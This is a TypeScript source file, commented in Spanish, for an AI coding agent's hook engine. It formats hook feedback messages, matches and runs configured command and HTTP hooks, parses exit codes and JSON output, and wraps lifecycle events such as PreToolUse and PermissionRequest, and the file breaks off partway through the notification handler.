/**
 * El motor de hooks y los mensajes de su feedback.
 *
 * Dos capas, de procedencia distinta:
 *
 * - Los SEIS formateadores de mensaje (`getPreToolHookBlockingMessage`…) son
 *   porte de `ccnmt: packages/agent/hooks.ts:2149-2210`, con fidelidad byte a
 *   byte del formato: el prefijo es el contrato que el modelo usa para
 *   distinguir un bloqueo de hook de un resultado de herramienta.
 * - El MOTOR de ejecución —matcher, ejecución de comandos y HTTP, lectura de
 *   exit codes y JSON, agregado para el bucle y los envoltorios por evento—
 *   es REIMPLEMENTACIÓN nativa desde el binario 2.1.275 (ver la sección
 *   «El motor de ejecución» más abajo). La referencia `ccnmt` de la que
 *   salieron los llamadores no está en este contenedor, y el texto del
 *   binario es propietario: se reproduce el contrato, no el cuerpo.
 *
 * `HookBlockingError` se declara con `command` opcional porque el test de
 * los formateadores construye el objeto sin él; el motor siempre lo rellena.
 */

import { getHooksConfigFromSnapshot, shouldDisableAllHooksIncludingManaged, shouldAllowManagedHooksOnly } from './hooksConfigSnapshot.js'
import { createAttachmentMessage } from './internal/queryRuntime.js'
import { getSessionId as runtimeSessionId, getCwdState } from './internal/sessionRuntime.js'
import { execHttpHook } from './hooks/execHttpHook.js'
import type { AgentMessage } from './internalTypes.js'
import { buildHookProgressMessage, type HookDisplaySource, type HookProgressMessage } from './hooks/hookProgress.js'
import { isHookEvent, isAsyncHookJSONOutput, promptRequestSchema, type HookCommand, type HookEvent, type PromptRequest, type PromptResponse, isSyncHookJSONOutput, hookJSONOutputSchema } from './types/hooks.js'
import type { PermissionUpdate } from '@thyrox/permission/permissionTypes.js'
import { spawn, type ChildProcessWithoutNullStreams } from 'node:child_process'
import {
  DEFAULT_HOOK_SHELL,
  buildPowerShellArgs,
  formatShellPrefixCommand,
  getCachedPowerShellPath,
  quote,
  subprocessEnv,
  wrapSpawn,
} from '@thyrox/shell'
import { SandboxManager } from '@thyrox/shell/sandbox/sandbox-adapter.js'
import { getPlatform } from '@thyrox/config/platform.js'
import { readEnv } from '@thyrox/config/env/utils'
import { loadPluginOptions } from '@thyrox/config/plugin/pluginOptionsStorage'
import { getPluginDataDir } from '@thyrox/config/plugin/pluginDirectories'
import { findGitBashPath, windowsPathToPosixPath } from '@thyrox/storage/windowsPaths.js'
import { getHookEnvFilePath } from '@thyrox/storage/sessionEnvironment.js'
import { getCwd } from '@thyrox/app-host/bootstrap/cwd.js'
import { getOriginalCwd, getProjectRoot, getRegisteredHooks, getIsNonInteractiveSession } from '@thyrox/app-host/bootstrap/state.js'
import { TaskOutput } from '@thyrox/tool-registry/task/TaskOutput.js'
import { logForDebugging } from '@thyrox/local-observability/debug.js'
import { logForDiagnosticsNoPII } from '@thyrox/local-observability/logging'
import { firstLineOf } from '@thyrox/output/utils/stringUtils.js'
import { errorMessage, getErrnoCode, jsonStringify, pathExists } from './internalUtils.js'
import { replaceExecArgTemplate, replaceExecArgUserConfig } from './hooks/hookExecArgs.js'
import { startHookProgressInterval } from '@thyrox/repl/hookEvents.js'
import type { HookInput, HookCallback, HookCallbackMatcher } from './types/hooks.js'
import type { FunctionHook } from './hooks/sessionHooks.js'
import type { Message } from './messageShapes.js'
import type { Tools } from '@thyrox/tool-registry/Tool.js'
import type { ShellCommand } from '@thyrox/shell/shellCommand.js'
import type { AsyncHookJSONOutput } from '@thyrox/headless-sdk/agentSdkTypes.js'
import { registerPendingAsyncHook } from './hooks/AsyncHookRegistry.js'
import { enqueuePendingNotification } from './messageQueueManager.js'
import { wrapInSystemReminder, extractTextContent, getLastAssistantMessage } from './messages.js'
import { emitHookResponse } from './hooks/hookEvents.js'
import { getAgentTranscriptPath } from '@thyrox/storage/sessionStorage.js'
import { asAgentId } from './idTypes.js'
import type { AppState } from '@thyrox/app-host/state/AppState.js'
import type { HookMatcher, PluginHookMatcher, SkillHookMatcher } from '@thyrox/config/settings/types.js'
import { getSessionHooks, getSessionFunctionHooks, type SessionDerivedHookMatcher } from './hooks/sessionHooks.js'
import { basename } from 'node:path'
import { normalizeLegacyToolName, getLegacyToolNames } from '@thyrox/permission/permissionRuleParser.js'
import { findToolByName } from '@thyrox/tool-registry/Tool.js'
import { permissionRuleValueFromString } from '@thyrox/permission/permissionRuleParser'
import { checkHasTrustDialogAccepted } from '@thyrox/config/global/config.js'
import type { ElicitResult } from '@modelcontextprotocol/sdk/types.js'









export interface HookBlockingError {
  blockingError: string
  command?: string
}

/**
 * Formatea el mensaje de bloqueo de un hook PreToolUse.
 * @param hookName Nombre del hook (p.ej. 'PreToolUse:Write', 'PreToolUse:Bash')
 * @param blockingError El error de bloqueo del hook
 * @returns El mensaje de bloqueo formateado
 */
export function getPreToolHookBlockingMessage(
  hookName: string,
  blockingError: HookBlockingError,
): string {
  return `${hookName} hook error: ${blockingError.blockingError}`
}

/**
 * Formatea el mensaje de un hook Stop.
 * @param blockingError El error de bloqueo del hook
 * @returns El mensaje formateado como feedback para el modelo
 */
export function getStopHookMessage(blockingError: HookBlockingError): string {
  return `Stop hook feedback:\n${blockingError.blockingError}`
}

/**
 * Formatea el error de bloqueo de un hook TeammateIdle.
 * @param blockingError El error de bloqueo del hook
 * @returns El mensaje formateado como feedback para el modelo
 */
export function getTeammateIdleHookMessage(
  blockingError: HookBlockingError,
): string {
  return `TeammateIdle hook feedback:\n${blockingError.blockingError}`
}

/**
 * Formatea el error de bloqueo de un hook TaskCreated.
 * @param blockingError El error de bloqueo del hook
 * @returns El mensaje formateado como feedback para el modelo
 */
export function getTaskCreatedHookMessage(
  blockingError: HookBlockingError,
): string {
  return `TaskCreated hook feedback:\n${blockingError.blockingError}`
}

/**
 * Formatea el error de bloqueo de un hook TaskCompleted.
 * @param blockingError El error de bloqueo del hook
 * @returns El mensaje formateado como feedback para el modelo
 */
export function getTaskCompletedHookMessage(
  blockingError: HookBlockingError,
): string {
  return `TaskCompleted hook feedback:\n${blockingError.blockingError}`
}

/**
 * Formatea el mensaje de bloqueo de un hook UserPromptSubmit.
 * @param blockingError El error de bloqueo del hook
 * @returns El mensaje de bloqueo formateado
 */
export function getUserPromptSubmitHookBlockingMessage(
  blockingError: HookBlockingError,
): string {
  return `UserPromptSubmit operation blocked by hook:\n${blockingError.blockingError}`
}

// ─── El motor de ejecución ───────────────────────────────────────────────
//
// Reimplementación nativa desde el binario 2.1.275 (`chunk-q2gh92k2.js`), no
// copia: el texto de la fuente es propietario y lo que se reproduce es su
// CONTRATO —qué recibe cada hook, cómo se leen exit codes y JSON, qué campos
// devuelve cada función— con cuerpo escrito aquí. Las firmas son las de los
// llamadores de este árbol, que se copiaron de una versión anterior del
// cliente; donde el binario de hoy las cambió, manda el llamador.
//
// Lo que el motor NO resuelve por su cuenta: de dónde sale la configuración.
// La lee del snapshot (`hooksConfigSnapshot.ts`), y el snapshot no tiene aún
// un store de settings en vivo que lo pueble —se fija con
// `setHooksConfigSnapshot`—. Sin eso, en producción no hay hooks que correr y
// cada función devuelve su vacío, que es el mismo desenlace que el cliente da
// cuando no hay hooks configurados.


/** Plazo por defecto de un hook, en milisegundos (`du=600000` en 2.1.275). */
export const DEFAULT_HOOK_TIMEOUT_MS = 600_000

/** Piso del plazo de SessionEnd (`m$r=1500`). */
export const SESSION_END_HOOK_TIMEOUT_MS_DEFAULT = 1500

/** Techo del plazo de SessionEnd (`Nes=60000`). */
const SESSION_END_HOOK_TIMEOUT_MS_MAX = 60_000

/** Plazo de la sugerencia de archivos (el `s=5000` de `F4n`). */
const FILE_SUGGESTION_TIMEOUT_MS = 5000

type HookInputRecord = { hook_event_name: string; [key: string]: unknown }

type ConfiguredHook = {
  type: string
  command?: string
  url?: string
  prompt?: string
  timeout?: number
  [key: string]: unknown
}

type ConfiguredMatcher = { matcher?: string; hooks?: ConfiguredHook[] }

/** El resultado de UN hook fuera del REPL — la forma que devuelve `sT`. */
export type HookOutsideReplResult = {
  command: string
  succeeded: boolean
  output: string
  blocked: boolean
  exitCode?: number
  watchPaths?: string[]
  systemMessage?: string
  cancelled?: boolean
}

/** El adjunto que un hook deja en la conversación (`hook_success`, `hook_cancelled`…). */
export type HookAttachmentMessage = AgentMessage & {
  type: 'attachment'
  attachment: { type: string; [key: string]: unknown }
}

/**
 * La decisión de un hook `PermissionRequest` (`hookSpecificOutput.decision`):
 * los llamadores leen `behavior` y, según él, `updatedInput`/`updatedPermissions`
 * o `message`/`interrupt`.
 */
export type PermissionRequestHookDecision =
  | { behavior: 'allow'; updatedInput?: Record<string, unknown>; updatedPermissions?: PermissionUpdate[] }
  | { behavior: 'deny'; message?: string; interrupt?: boolean }

/**
 * El resultado de UN hook dentro del bucle, antes de agregarse.
 *
 * Sin firma de índice, a propósito: con `[key: string]: unknown` el `Omit` de
 * `AggregatedHookResult` colapsa cada campo conocido a `unknown`, y los
 * llamadores reciben `{}` donde leen `message.attachment` o `behavior`.
 */
export type HookResult = {
  outcome: 'success' | 'blocking' | 'non_blocking_error' | 'cancelled'
  message?: HookAttachmentMessage
  blockingError?: HookBlockingError
  preventContinuation?: boolean
  stopReason?: string
  permissionBehavior?: 'allow' | 'deny' | 'ask' | 'passthrough' | 'defer'
  hookPermissionDecisionReason?: string
  hookSource?: string
  additionalContext?: string
  updatedInput?: Record<string, unknown>
  updatedMCPToolOutput?: unknown
  permissionRequestResult?: PermissionRequestHookDecision
  retry?: boolean
}

/** Lo que cada iteración de `executeHooks` entrega al bucle. */
export type AggregatedHookResult = Omit<HookResult, 'outcome' | 'additionalContext' | 'message'> & {
  /**
   * El adjunto de un hook terminado, o el progreso de uno a punto de
   * lanzarse: 2.1.281 emite los dos por el mismo canal.
   */
  message?: HookAttachmentMessage | HookProgressMessage
  additionalContexts?: string[]
}

/**
 * ¿Casa este matcher con lo que se consulta?
 *
 * Tres formas, en el orden del binario (`rBn`): vacío o `*` casa con todo;
 * una lista simple de identificadores (`Write|Edit`) es pertenencia EXACTA
 * —`MultiEdit` no casa con `Edit`—; lo demás es una expresión regular sin
 * anclar. Un patrón que no compila no casa, en vez de reventar el turno.
 */
export function hookMatcherMatches(matcher: string | undefined, query: string | undefined): boolean {
  if (!matcher || matcher === '*') return true
  if (query === undefined) return true
  if (/^[a-zA-Z0-9_|]+$/.test(matcher)) return matcher.split('|').includes(query)
  try {
    return new RegExp(matcher).test(query)
  } catch {
    return false
  }
}

function safeSessionId(): string {
  try {
    return runtimeSessionId()
  } catch {
    return 'unknown'
  }
}

function safeCwd(): string {
  try {
    return getCwdState()
  } catch {
    return process.cwd()
  }
}

/**
 * La parte común de toda entrada de hook (`_l` en el binario): sesión,
 * transcript, cwd y, si se conocen, el modo de permiso y el agente.
 */
export function createBaseHookInput(
  permissionMode?: string,
  sessionId?: string,
  agentInfo?: { agentId?: string; agentType?: string },
): { session_id: string; transcript_path: string; cwd: string; permission_mode?: string; agent_id?: string; agent_type?: string } {
  const id = sessionId ?? safeSessionId()
  return {
    session_id: id,
    transcript_path: process.env.CLAUDE_TRANSCRIPT_PATH ?? '',
    cwd: safeCwd(),
    ...(permissionMode !== undefined && { permission_mode: permissionMode }),
    ...(agentInfo?.agentId !== undefined && { agent_id: agentInfo.agentId }),
    ...(agentInfo?.agentType !== undefined && { agent_type: agentInfo.agentType }),
  }
}

function configuredMatchers(event: string): ConfiguredMatcher[] {
  const value = getHooksConfigFromSnapshot()[event]
  return Array.isArray(value) ? (value as ConfiguredMatcher[]) : []
}

function matchingHooks(event: string, matchQuery?: string): ConfiguredHook[] {
  if (shouldDisableAllHooksIncludingManaged()) return []
  const hooks: ConfiguredHook[] = []
  for (const group of configuredMatchers(event)) {
    if (!hookMatcherMatches(group.matcher, matchQuery)) continue
    for (const hook of group.hooks ?? []) hooks.push(hook)
  }
  return hooks
}

/** ¿Hay al menos un hook configurado para el evento? (`Uk`). */
export function hasHookForEvent(event: string): boolean {
  return configuredMatchers(event).some((g) => (g.hooks ?? []).length > 0)
}

type CommandRun = { status: number | null; stdout: string; stderr: string; aborted: boolean }

async function runCommand(command: string, input: string, timeoutMs: number, signal?: AbortSignal, cwd?: string): Promise<CommandRun> {
  const proc = Bun.spawn(['bash', '-c', command], {
    stdin: Buffer.from(input),
    stdout: 'pipe',
    stderr: 'pipe',
    cwd,
  })
  let timer: ReturnType<typeof setTimeout> | undefined
  const expired = new Promise<'expired'>((r) => {
    timer = setTimeout(() => r('expired'), timeoutMs)
  })
  const aborted = signal
    ? new Promise<'aborted'>((r) => {
        if (signal.aborted) r('aborted')
        else signal.addEventListener('abort', () => r('aborted'), { once: true })
      })
    : new Promise<never>(() => {})
  // Como en `loop/hooks.ts`: al cortar NO se leen las tuberías, porque un
  // nieto del hook puede mantenerlas abiertas y colgar la lectura.
  const outcome = await Promise.race([proc.exited.then((c) => ({ code: c })), expired, aborted])
  clearTimeout(timer)
  if (outcome === 'expired' || outcome === 'aborted') {
    proc.kill(9)
    return { status: null, stdout: '', stderr: outcome === 'expired' ? `timeout tras ${timeoutMs} ms` : '', aborted: outcome === 'aborted' }
  }
  const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
  return { status: outcome.code, stdout, stderr, aborted: false }
}

type ParsedOutput = Record<string, any> | undefined

function parseJsonOutput(stdout: string): ParsedOutput {
  const text = stdout.trim()
  if (!text.startsWith('{')) return undefined
  try {
    const value = JSON.parse(text)
    return value && typeof value === 'object' && !Array.isArray(value) ? value : undefined
  } catch {
    return undefined
  }
}

function hookLabel(hook: ConfiguredHook): string {
  return hook.command ?? hook.url ?? hook.prompt ?? hook.type
}

async function runOneOutsideRepl(
  hook: ConfiguredHook,
  event: string,
  input: string,
  timeoutMs: number,
  signal?: AbortSignal,
  cwd?: string,
): Promise<HookOutsideReplResult> {
  const command = hookLabel(hook)
  if (hook.type === 'prompt' || hook.type === 'agent') {
    const kind = hook.type === 'prompt' ? 'Prompt' : 'Agent'
    return { command, succeeded: false, output: `${kind} stop hooks are not yet supported outside REPL`, blocked: false }
  }
  if (hook.type === 'http') {
    try {
      const r = await execHttpHook(hook as never, event as never, input, signal)
      if (r.aborted) return { command, succeeded: false, output: 'Hook cancelled', blocked: false, cancelled: true }
      if (r.error || !r.ok) return { command, succeeded: false, output: r.error || `HTTP ${r.statusCode} from ${hook.url}`, blocked: false }
      const json = parseJsonOutput(r.body)
      const blocked = json?.decision === 'block'
      const output = blocked ? (json?.reason ?? '') : event === 'WorktreeCreate' ? (json?.hookSpecificOutput?.worktreePath ?? '') : r.body
      return { command, succeeded: true, output, blocked, systemMessage: json?.systemMessage }
    } catch (e) {
      return { command, succeeded: false, output: e instanceof Error ? e.message : String(e), blocked: false }
    }
  }
  if (hook.type !== 'command' || !hook.command) {
    return { command, succeeded: false, output: `tipo de hook sin ejecutor fuera del REPL: ${hook.type}`, blocked: false }
  }
  const limit = hook.timeout ? hook.timeout * 1000 : timeoutMs
  const run = await runCommand(hook.command, input, limit, signal, cwd)
  if (run.aborted) return { command, succeeded: false, output: 'Hook cancelled', blocked: false, cancelled: true }
  if (run.status === null) return { command, succeeded: false, output: run.stderr, blocked: false }
  const json = parseJsonOutput(run.stdout)
  const decidedBlock = json?.decision === 'block'
  const blocked = run.status === 2 || decidedBlock
  const output = decidedBlock ? (json?.reason || run.stderr || '') : run.status === 0 ? run.stdout : run.stderr
  const watchPaths = json?.hookSpecificOutput && 'watchPaths' in json.hookSpecificOutput ? json.hookSpecificOutput.watchPaths : undefined
  return {
    command,
    succeeded: run.status === 0,
    output,
    blocked,
    exitCode: run.status,
    ...(watchPaths !== undefined && { watchPaths }),
    ...(json?.systemMessage !== undefined && { systemMessage: json.systemMessage }),
  }
}

/**
 * Corre los hooks de un evento que NO pasa por el bucle (`sT`): todos en
 * paralelo, y devuelve un resultado por hook. Exit 0 es éxito con el stdout;
 * exit 2 o `decision: "block"` bloquean con el stderr o el `reason`; otro
 * código falla sin bloquear. Un hook colgado se corta en su plazo.
 */
export async function executeHooksOutsideREPL(params: {
  hookInput: HookInputRecord
  matchQuery?: string
  signal?: AbortSignal
  timeoutMs?: number
  [key: string]: unknown
}): Promise<HookOutsideReplResult[]> {
  const { hookInput, matchQuery, signal, timeoutMs = DEFAULT_HOOK_TIMEOUT_MS } = params
  const hooks = matchingHooks(hookInput.hook_event_name, matchQuery)
  if (hooks.length === 0 || signal?.aborted) return []
  const input = JSON.stringify(hookInput)
  const cwd = typeof hookInput.cwd === 'string' ? hookInput.cwd : undefined
  return Promise.all(hooks.map((h) => runOneOutsideRepl(h, hookInput.hook_event_name, input, timeoutMs, signal, cwd)))
}

/** ¿Alguno de los resultados bloqueó? (`N4n`). */
export function hasBlockingResult(results: HookOutsideReplResult[]): boolean {
  return results.some((r) => r.blocked)
}

function attachment(fields: { type: string; [key: string]: unknown }): HookAttachmentMessage {
  try {
    return createAttachmentMessage(fields) as HookAttachmentMessage
  } catch {
    // Sin host bindings instalados (un test, un proceso sin REPL) la fábrica
    // lanza: se devuelve la misma forma que su respaldo.
    return { type: 'attachment', attachment: fields, uuid: crypto.randomUUID(), timestamp: new Date().toISOString() }
  }
}

/** Eventos cuyo stdout plano (no JSON) entra al contexto del modelo. */
const PLAIN_STDOUT_IS_CONTEXT = new Set(['UserPromptSubmit', 'SessionStart'])

function resultFromCommand(
  event: string,
  hook: ConfiguredHook,
  run: CommandRun,
  hookName: string,
  toolUseID: string,
): HookResult {
  const command = hookLabel(hook)
  const base = { hookName, toolUseID, hookEvent: event }
  if (run.aborted) {
    return { outcome: 'cancelled', message: attachment({ type: 'hook_cancelled', ...base }) }
  }
  if (run.status === null) {
    return { outcome: 'non_blocking_error', message: attachment({ type: 'hook_non_blocking_error', ...base, stderr: run.stderr, stdout: '', exitCode: 1, command }) }
  }
  if (run.status === 2) {
    return { outcome: 'blocking', blockingError: { blockingError: run.stderr.trim() || `${command}: exit 2`, command } }
  }
  if (run.status !== 0) {
    return { outcome: 'non_blocking_error', message: attachment({ type: 'hook_non_blocking_error', ...base, stderr: run.stderr, stdout: run.stdout, exitCode: run.status, command }) }
  }
  const json = parseJsonOutput(run.stdout)
  const result: HookResult = { outcome: 'success', message: attachment({ type: 'hook_success', ...base, content: run.stdout, stdout: run.stdout, stderr: run.stderr, exitCode: 0, command }) }
  if (!json) {
    if (PLAIN_STDOUT_IS_CONTEXT.has(event) && run.stdout.trim()) result.additionalContext = run.stdout.trim()
    return result
  }
  if (json.continue === false) {
    result.preventContinuation = true
    if (typeof json.stopReason === 'string') result.stopReason = json.stopReason
  }
  if (json.decision === 'block') {
    result.outcome = 'blocking'
    result.blockingError = { blockingError: json.reason || 'Blocked by hook', command }
  } else if (json.decision === 'approve' && event === 'PreToolUse') {
    result.permissionBehavior = 'allow'
    if (json.reason) result.hookPermissionDecisionReason = json.reason
  }
  const specific = json.hookSpecificOutput
  if (specific && typeof specific === 'object') {
    if (specific.permissionDecision) {
      result.permissionBehavior = specific.permissionDecision
      if (specific.permissionDecisionReason !== undefined) result.hookPermissionDecisionReason = specific.permissionDecisionReason
    }
    if (specific.updatedInput && typeof specific.updatedInput === 'object') result.updatedInput = specific.updatedInput
    if (typeof specific.additionalContext === 'string') result.additionalContext = specific.additionalContext
    if (specific.updatedMCPToolOutput !== undefined) result.updatedMCPToolOutput = specific.updatedMCPToolOutput
    if (event === 'PermissionRequest' && specific.decision !== undefined) result.permissionRequestResult = specific.decision
    if (event === 'PermissionDenied' && specific.retry === true) result.retry = true
  }
  if (typeof json.systemMessage === 'string') {
    result.message = attachment({ type: 'hook_system_message', ...base, content: json.systemMessage })
  }
  return result
}

function aggregate(result: HookResult): AggregatedHookResult {
  const { outcome: _outcome, additionalContext, ...rest } = result
  return additionalContext ? { ...rest, additionalContexts: [additionalContext] } : rest
}

/**
 * Corre los hooks de un evento DENTRO del bucle (`tv`) y entrega un agregado
 * por hook, en el orden en que terminan. Los llamadores leen de cada uno
 * `message`, `blockingError`, `preventContinuation`/`stopReason`,
 * `permissionBehavior`, `updatedInput`, `additionalContexts`…
 */
export async function* executeHooks(params: {
  hookInput: HookInputRecord
  toolUseID: string
  matchQuery?: string
  signal?: AbortSignal
  timeoutMs?: number
  toolUseContext?: unknown
  [key: string]: unknown
}): AsyncGenerator<AggregatedHookResult> {
  const { hookInput, toolUseID, matchQuery, signal, timeoutMs = DEFAULT_HOOK_TIMEOUT_MS } = params
  const event = hookInput.hook_event_name
  const hooks = matchingHooks(event, matchQuery)
  if (hooks.length === 0 || signal?.aborted) return
  const input = JSON.stringify(hookInput)
  const hookName = matchQuery ? `${event}:${matchQuery}` : event
  const cwd = typeof hookInput.cwd === 'string' ? hookInput.cwd : undefined
  // 2.1.281: un progreso por hook que casa, ANTES de lanzarlos — el
  // `for(let{hook:Eo}of Ft)yield{message:{type:"progress",…}}` del motor.
  if (isHookEvent(event)) {
    for (const hook of hooks) {
      yield { message: buildHookProgressMessage(hook as HookDisplaySource, event, hookName, toolUseID) }
    }
  }
  const pending = new Map<number, Promise<{ index: number; result: HookResult }>>()
  hooks.forEach((hook, index) => {
    const work = (async (): Promise<HookResult> => {
      if (hook.type === 'command' && hook.command) {
        const run = await runCommand(hook.command, input, hook.timeout ? hook.timeout * 1000 : timeoutMs, signal, cwd)
        return resultFromCommand(event, hook, run, hookName, toolUseID)
      }
      // http/prompt/agent pasan por el camino fuera del REPL y se traducen:
      // conservan bloqueo y salida, que es lo que el agregado necesita.
      const outside = await runOneOutsideRepl(hook, event, input, timeoutMs, signal, cwd)
      if (outside.blocked) return { outcome: 'blocking', blockingError: { blockingError: outside.output, command: outside.command } }
      if (!outside.succeeded) return { outcome: 'non_blocking_error', message: attachment({ type: 'hook_non_blocking_error', hookName, toolUseID, hookEvent: event, stderr: outside.output, stdout: '', exitCode: 1, command: outside.command }) }
      return { outcome: 'success', message: attachment({ type: 'hook_success', hookName, toolUseID, hookEvent: event, content: outside.output }) }
    })()
    pending.set(index, work.then((result) => ({ index, result })))
  })
  while (pending.size > 0) {
    const { index, result } = await Promise.race(pending.values())
    pending.delete(index)
    yield aggregate(result)
  }
}

function permissionModeOf(toolUseContext: any, given?: string): string | undefined {
  if (given !== undefined) return given
  try {
    return toolUseContext?.getAppState?.()?.toolPermissionContext?.mode
  } catch {
    return undefined
  }
}

function agentInfoOf(toolUseContext: any): { agentId?: string; agentType?: string } | undefined {
  if (!toolUseContext?.agentId) return undefined
  return { agentId: toolUseContext.agentId, agentType: toolUseContext.agentType }
}

// ─── Envoltorios por evento del bucle ────────────────────────────────────

export async function* executePreToolHooks(
  toolName: string,
  toolUseID: string,
  toolInput: unknown,
  toolUseContext: unknown,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
  _requestPrompt?: unknown,
  _toolUseSummary?: unknown,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput = {
    ...createBaseHookInput(permissionModeOf(toolUseContext, permissionMode), undefined, agentInfoOf(toolUseContext)),
    hook_event_name: 'PreToolUse',
    tool_name: toolName,
    tool_input: toolInput,
    tool_use_id: toolUseID,
  }
  yield* executeHooks({ hookInput, toolUseID, matchQuery: toolName, signal, timeoutMs, toolUseContext })
}

export async function* executePostToolHooks(
  toolName: string,
  toolUseID: string,
  toolInput: unknown,
  toolResponse: unknown,
  toolUseContext: unknown,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput = {
    ...createBaseHookInput(permissionModeOf(toolUseContext, permissionMode), undefined, agentInfoOf(toolUseContext)),
    hook_event_name: 'PostToolUse',
    tool_name: toolName,
    tool_input: toolInput,
    tool_response: toolResponse,
    tool_use_id: toolUseID,
  }
  yield* executeHooks({ hookInput, toolUseID, matchQuery: toolName, signal, timeoutMs, toolUseContext })
}

export async function* executePostToolUseFailureHooks(
  toolName: string,
  toolUseID: string,
  toolInput: unknown,
  error: string,
  toolUseContext: unknown,
  isInterrupt?: boolean,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput = {
    ...createBaseHookInput(permissionModeOf(toolUseContext, permissionMode), undefined, agentInfoOf(toolUseContext)),
    hook_event_name: 'PostToolUseFailure',
    tool_name: toolName,
    tool_input: toolInput,
    tool_use_id: toolUseID,
    error,
    is_interrupt: isInterrupt,
  }
  yield* executeHooks({ hookInput, toolUseID, matchQuery: toolName, signal, timeoutMs, toolUseContext })
}

/**
 * PostToolBatch (`T1t`): una vez por lote de llamadas paralelas, antes de la
 * siguiente petición al modelo. Sin matcher: el lote no tiene una herramienta
 * dueña.
 */
export async function* executePostToolBatchHooks(
  toolCalls: unknown[],
  toolUseContext: unknown,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput = {
    ...createBaseHookInput(permissionModeOf(toolUseContext, permissionMode), undefined, agentInfoOf(toolUseContext)),
    hook_event_name: 'PostToolBatch',
    tool_calls: toolCalls,
  }
  yield* executeHooks({ hookInput, toolUseID: crypto.randomUUID(), signal, timeoutMs, toolUseContext })
}

export async function* executePermissionRequestHooks(
  toolName: string,
  toolUseID: string,
  toolInput: unknown,
  toolUseContext: unknown,
  permissionMode?: string,
  permissionSuggestions?: unknown,
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput = {
    ...createBaseHookInput(permissionModeOf(toolUseContext, permissionMode), undefined, agentInfoOf(toolUseContext)),
    hook_event_name: 'PermissionRequest',
    tool_name: toolName,
    tool_input: toolInput,
    permission_suggestions: permissionSuggestions,
  }
  yield* executeHooks({ hookInput, toolUseID, matchQuery: toolName, signal, timeoutMs, toolUseContext })
}

export async function* executePermissionDeniedHooks(
  toolName: string,
  toolUseID: string,
  toolInput: unknown,
  reason: string,
  toolUseContext: unknown,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput = {
    ...createBaseHookInput(permissionModeOf(toolUseContext, permissionMode), undefined, agentInfoOf(toolUseContext)),
    hook_event_name: 'PermissionDenied',
    tool_name: toolName,
    tool_input: toolInput,
    tool_use_id: toolUseID,
    reason,
  }
  yield* executeHooks({ hookInput, toolUseID, matchQuery: toolName, signal, timeoutMs, toolUseContext })
}

export async function* executeUserPromptSubmitHooks(
  prompt: string,
  permissionMode?: string,
  toolUseContext?: unknown,
  _requestPrompt?: unknown,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput = {
    ...createBaseHookInput(permissionModeOf(toolUseContext, permissionMode), undefined, agentInfoOf(toolUseContext)),
    hook_event_name: 'UserPromptSubmit',
    prompt,
  }
  const signal = (toolUseContext as any)?.abortController?.signal
  yield* executeHooks({ hookInput, toolUseID: crypto.randomUUID(), signal, toolUseContext })
}

export async function* executeUserPromptExpansionHooks(
  expansionType: string,
  commandName: string,
  commandArgs: string,
  commandSource: unknown,
  prompt: string,
  toolUseContext?: unknown,
  permissionMode?: string,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput = {
    ...createBaseHookInput(permissionModeOf(toolUseContext, permissionMode), undefined, agentInfoOf(toolUseContext)),
    hook_event_name: 'UserPromptExpansion',
    expansion_type: expansionType,
    command_name: commandName,
    command_args: commandArgs,
    command_source: commandSource,
    prompt,
  }
  const signal = (toolUseContext as any)?.abortController?.signal
  yield* executeHooks({ hookInput, toolUseID: crypto.randomUUID(), matchQuery: commandName, signal, toolUseContext })
}

export async function* executeSubagentStartHooks(
  agentId: string,
  agentType: string,
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput = { ...createBaseHookInput(), hook_event_name: 'SubagentStart', agent_id: agentId, agent_type: agentType }
  yield* executeHooks({ hookInput, toolUseID: crypto.randomUUID(), matchQuery: agentType, signal, timeoutMs })
}

export async function* executeTaskCreatedHooks(
  taskId: string,
  taskSubject: string,
  taskDescription?: string,
  teammateName?: string,
  teamName?: string,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
  toolUseContext?: unknown,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput = {
    ...createBaseHookInput(permissionModeOf(toolUseContext, permissionMode)),
    hook_event_name: 'TaskCreated',
    task_id: taskId,
    task_subject: taskSubject,
    task_description: taskDescription,
    teammate_name: teammateName,
    team_name: teamName,
  }
  yield* executeHooks({ hookInput, toolUseID: crypto.randomUUID(), signal, timeoutMs, toolUseContext })
}

export async function* executeTaskCompletedHooks(
  taskId: string,
  taskSubject: string,
  taskDescription?: string,
  teammateName?: string,
  teamName?: string,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
  toolUseContext?: unknown,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput = {
    ...createBaseHookInput(permissionModeOf(toolUseContext, permissionMode)),
    hook_event_name: 'TaskCompleted',
    task_id: taskId,
    task_subject: taskSubject,
    task_description: taskDescription,
    teammate_name: teammateName,
    team_name: teamName,
  }
  yield* executeHooks({ hookInput, toolUseID: crypto.randomUUID(), signal, timeoutMs, toolUseContext })
}

// ─── Eventos fuera del bucle ─────────────────────────────────────────────

export async function executeNotificationHooks(
  notification: { message: string; title?: string; notificationType?: string },
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
): Promise<void> {
  const hookInput = {
    ...createBaseHookInput(),
    hook_event_name: 'Notification',
    message: notification.message,
    title: notification.title,
